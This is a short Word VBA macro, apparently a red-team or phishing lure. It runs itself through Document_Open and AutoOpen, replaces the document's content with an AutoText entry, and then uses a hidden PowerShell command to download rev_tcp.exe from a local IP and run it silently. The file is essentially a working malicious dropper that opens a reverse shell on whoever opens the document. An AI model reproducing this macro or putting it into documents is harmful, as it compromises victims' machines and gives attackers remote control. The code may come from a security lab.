Sub Demo1()
    ' subsitute contents
    ActiveDocument.Content.Select
    Selection.Delete
    ActiveDocument.AttachedTemplate.AutoTextEntries("Demo1").Insert Where:=Selection.Range, RichText:=True

    Dim psexec As String
    psexec = "powershell Invoke-WebRequest 'http://192.168.111.133/rev_tcp.exe' -OutFile rev_tcp.exe" ' HERE: update IP if needed
    CreateObject("Wscript.Shell").Run psexec, 0
    
    Dim exePath As String
    exe = ActiveDocument.Path + "\rev_tcp.exe"
    Wait 2
    CreateObject("Wscript.Shell").Run exe, 0
End Sub

Sub Document_Open()
    Demo1
End Sub

Sub AutoOpen()
    Demo1
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
